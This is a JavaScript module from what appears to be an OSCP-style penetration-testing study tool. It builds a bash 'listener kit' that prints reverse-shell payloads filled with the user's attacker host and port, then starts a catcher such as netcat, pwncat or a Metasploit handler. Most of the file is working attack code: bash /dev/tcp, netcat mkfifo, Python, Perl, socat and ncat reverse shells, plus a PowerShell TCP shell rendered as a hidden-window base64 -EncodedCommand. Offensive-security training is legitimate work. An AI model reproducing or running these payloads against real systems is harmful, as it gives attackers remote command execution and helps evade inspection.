/*!
 * obol engine — shellkit.js — the Shell Station (OBOL.shellkit). Pure, Node-safe, tested.
 *
 * Turns your LHOST/LPORT into a one-download LISTENER KIT: a .sh that prints every reverse-shell
 * payload filled in, the PowerShell -EncodedCommand (UTF-16LE then base64, the way OffSec teaches it
 * for the OSCP), and the TTY-upgrade sequence, then starts your chosen catcher in the foreground so it
 * is listening the moment you run it. obol writes the script; you run it on your own Kali box. Nothing
 * executes here. The payload set mirrors the Workbench reverse-shell catalogue (the common OSCP set).
 * House style: no em or en dashes.
 */
(function (root) {
  'use strict';
  var OBOL = root.OBOL = root.OBOL || {};

  // ── catchers: the listener you start on your box ──────────────────────────────────────────────
  var CATCHERS = [
    { id: 'nc', label: 'netcat', cmd: function (p) { return 'nc -lvnp ' + p; }, teach: 'The universal default. No PTY, so finish with the TTY upgrade below.', install: 'sudo apt install -y netcat-traditional' },
    { id: 'rlwrap-nc', label: 'rlwrap + nc', cmd: function (p) { return 'rlwrap -cAr nc -lvnp ' + p; }, teach: 'netcat with arrow keys and history, a much nicer raw shell while you upgrade.', install: 'sudo apt install -y rlwrap netcat-traditional' },
    { id: 'ncat-ssl', label: 'ncat (TLS)', cmd: function (p) { return 'ncat --ssl -lvnp ' + p; }, teach: 'Encrypted catcher; pair with the ncat (TLS) payload so the shell is not plaintext on the wire.', install: 'sudo apt install -y ncat' },
    { id: 'pwncat', label: 'pwncat-cs', cmd: function (p) { return 'pwncat-cs -lp ' + p; }, teach: 'Auto-upgrades to a full PTY, survives drops, and has upload/download built in. The nicest option when installed.', install: 'pipx install pwncat-cs' },
    { id: 'socat', label: 'socat (PTY)', cmd: function (p) { return 'socat file:`tty`,raw,echo=0 TCP-LISTEN:' + p; }, teach: 'Gives a full PTY directly when the target also has socat. Pair with the socat payload.', install: 'sudo apt install -y socat' },
    { id: 'msf', label: 'metasploit multi/handler', cmd: function (p) { return 'msfconsole -q -x "use exploit/multi/handler; set payload generic/shell_reverse_tcp; set LHOST tun0; set LPORT ' + p + '; set ExitOnSession false; run -j"'; }, teach: 'Use when the payload is a Meterpreter stager; overkill for a plain shell.', install: 'sudo apt install -y metasploit-framework' },
  ];

  // ── payloads: {{lhost}}/{{lport}} templates, grouped by os ────────────────────────────────────
  var PAYLOADS = [
    { id: 'bash-i', name: 'Bash -i', os: 'linux', tpl: 'bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1', note: 'The classic; needs a real bash.' },
    { id: 'sh-tcp', name: 'sh (/dev/tcp)', os: 'linux', tpl: 'sh -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1', note: 'For dash/sh default shells.' },
    { id: 'nc-mkfifo', name: 'nc (mkfifo)', os: 'linux', tpl: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {{lhost}} {{lport}} >/tmp/f', note: 'Portable: works with an nc that has no -e.' },
    { id: 'nc-e', name: 'nc -e', os: 'linux', tpl: 'nc {{lhost}} {{lport}} -e /bin/sh', note: 'Only if nc was built with -e.' },
    { id: 'python3', name: 'Python 3', os: 'linux', tpl: 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{{lhost}}",{{lport}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")\'', note: 'Very reliable and gives a PTY straight away.' },
    { id: 'socat', name: 'socat (PTY)', os: 'linux', tpl: 'socat TCP:{{lhost}}:{{lport}} EXEC:/bin/bash,pty,stderr,setsid,sigint,sane', note: 'Full PTY if the target has socat; pair with the socat catcher.' },
    { id: 'perl', name: 'Perl', os: 'linux', tpl: "perl -e 'use Socket;$i=\"{{lhost}}\";$p={{lport}};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'", note: 'When Perl is present but Python is not.' },
    { id: 'ncat-ssl', name: 'ncat (TLS)', os: 'linux', tpl: 'ncat --ssl {{lhost}} {{lport}} -e /bin/bash', note: 'Encrypted; pair with the ncat (TLS) catcher.' },
    { id: 'ps-tcp', name: 'PowerShell (TCP)', os: 'windows', enc: 'psenc', tpl: '$client = New-Object System.Net.Sockets.TCPClient("{{lhost}}",{{lport}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()', note: 'The standard Windows one-liner. Use the Base64 -EncodedCommand form so quoting cannot break it.' },
  ];

  function fill(tpl, lhost, lport) {
    return String(tpl).replace(/\{\{lhost\}\}/g, lhost || 'LHOST').replace(/\{\{lport\}\}/g, lport || 'LPORT');
  }

  // PowerShell -EncodedCommand: UTF-16LE, then base64 (exactly what powershell -e expects).
  function psEncode(script) {
    if (typeof Buffer !== 'undefined') return Buffer.from(String(script), 'utf16le').toString('base64');
    var s = String(script), bytes = [];
    for (var i = 0; i < s.length; i++) { var c = s.charCodeAt(i); bytes.push(c & 0xff, (c >> 8) & 0xff); }
    var bin = ''; for (var j = 0; j < bytes.length; j++) bin += String.fromCharCode(bytes[j]);
    return (typeof btoa !== 'undefined') ? btoa(bin) : bin;
  }
  // the full PowerShell -EncodedCommand invocation for the TCP payload.
  function psEncodedCommand(lhost, lport) {
    var ps = PAYLOADS.filter(function (p) { return p.id === 'ps-tcp'; })[0];
    return 'powershell -nop -w hidden -EncodedCommand ' + psEncode(fill(ps.tpl, lhost, lport));
  }

  // The standard "make this raw shell a real terminal" upgrade.
  function ttyUpgrade() {
    return [
      "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'   # or python / script -qc /bin/bash /dev/null",
      'export TERM=xterm',
      'Ctrl-Z',
      'stty raw -echo; fg   # then press Enter twice',
    ];
  }

  function catchers() { return CATCHERS.slice(); }
  function catcherById(id) { return CATCHERS.filter(function (c) { return c.id === id; })[0] || CATCHERS[0]; }
  function payloads(lhost, lport) { return PAYLOADS.map(function (p) { return { id: p.id, name: p.name, os: p.os, enc: p.enc || '', note: p.note, cmd: fill(p.tpl, lhost, lport) }; }); }

  // listenerKit(opts) -> the downloadable .sh. opts = {lhost, lport, catcher}. It prints the payload
  // menu, the PowerShell -EncodedCommand, and the TTY upgrade, then starts the catcher in the foreground.
  function listenerKit(opts) {
    opts = opts || {};
    var lhost = opts.lhost || 'LHOST', lport = String(opts.lport || '4444');
    var cat = catcherById(opts.catcher);
    var L = [];
    L.push('#!/usr/bin/env bash');
    L.push('# obol Shell Station listener kit. obol wrote this; you run it on your OWN attack box.');
    L.push('# It prints every reverse-shell payload filled with your LHOST/LPORT, then listens.');
    L.push('set -u');
    L.push('LHOST="' + lhost + '"');
    L.push('LPORT="' + lport + '"');
    L.push('');
    L.push('if ! [[ "$LPORT" =~ ^[0-9]+$ ]] || [ "$LPORT" -lt 1 ] || [ "$LPORT" -gt 65535 ]; then echo "[!] Bad LPORT: $LPORT"; exit 1; fi');
    L.push('if [ -z "$LHOST" ] || [ "$LHOST" = "LHOST" ]; then echo "[!] LHOST is not set. Set it in the Shell Station (your tun0 IP) and re-download."; exit 1; fi');
    L.push('echo "==================== obol Shell Station ===================="');
    L.push('echo "LHOST=$LHOST  LPORT=$LPORT   catcher: ' + cat.label + '"');
    L.push('echo');
    L.push('echo "--- Linux payloads (paste one on the target) ---"');
    payloads(lhost, lport).filter(function (p) { return p.os === 'linux'; }).forEach(function (p) {
      L.push('cat <<\'OBOL_EOF\'');
      L.push('# ' + p.name + ': ' + p.note);
      L.push(p.cmd);
      L.push('OBOL_EOF');
    });
    L.push('echo');
    L.push('echo "--- Windows PowerShell ---"');
    L.push('cat <<\'OBOL_EOF\'');
    L.push('# PowerShell (TCP), raw:');
    L.push(fill(PAYLOADS.filter(function (p) { return p.id === 'ps-tcp'; })[0].tpl, lhost, lport));
    L.push('');
    L.push('# PowerShell -EncodedCommand (UTF-16LE then base64, quoting-proof):');
    L.push(psEncodedCommand(lhost, lport));
    L.push('OBOL_EOF');
    L.push('echo');
    L.push('echo "--- After you catch the shell, upgrade the TTY ---"');
    L.push('cat <<\'OBOL_EOF\'');
    ttyUpgrade().forEach(function (line) { L.push(line); });
    L.push('OBOL_EOF');
    L.push('echo');
    L.push('echo "[*] Listening on :$LPORT  (Ctrl-C to stop)"');
    if (cat.id === 'msf') L.push(cat.cmd(lport));
    else L.push('exec ' + cat.cmd('"$LPORT"'));
    return L.join('\n') + '\n';
  }

  OBOL.shellkit = {
    catchers: catchers, catcherById: catcherById, payloads: payloads, fill: fill,
    psEncode: psEncode, psEncodedCommand: psEncodedCommand, ttyUpgrade: ttyUpgrade, listenerKit: listenerKit,
  };
})(typeof globalThis !== 'undefined' ? globalThis : this);
